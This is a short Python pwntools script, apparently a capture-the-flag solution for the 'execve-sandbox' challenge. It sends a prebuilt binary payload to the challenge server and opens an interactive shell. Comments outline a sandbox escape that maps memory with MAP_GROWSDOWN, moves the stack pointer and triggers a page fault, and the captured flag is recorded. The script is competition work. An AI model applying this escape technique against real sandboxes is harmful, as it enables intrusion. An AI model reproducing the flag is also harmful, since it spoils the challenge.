#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.13"
port = 4869
host = "execve-sandbox.ctfcompetition.com"
port = 1337
# CTF{Time_to_read_that_underrated_Large_Memory_Management_Vulnerabilities_paper}


# mmap(0x11000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_GROWSDOWN, -1, 0) 
# change rsp to 0x11000
# trigger page fault

r = remote(host,port)
f = open("./asm.bin","r")
elf_data = f.read()
r.send(elf_data.ljust(0x1000,"\x90"))
r.interactive()
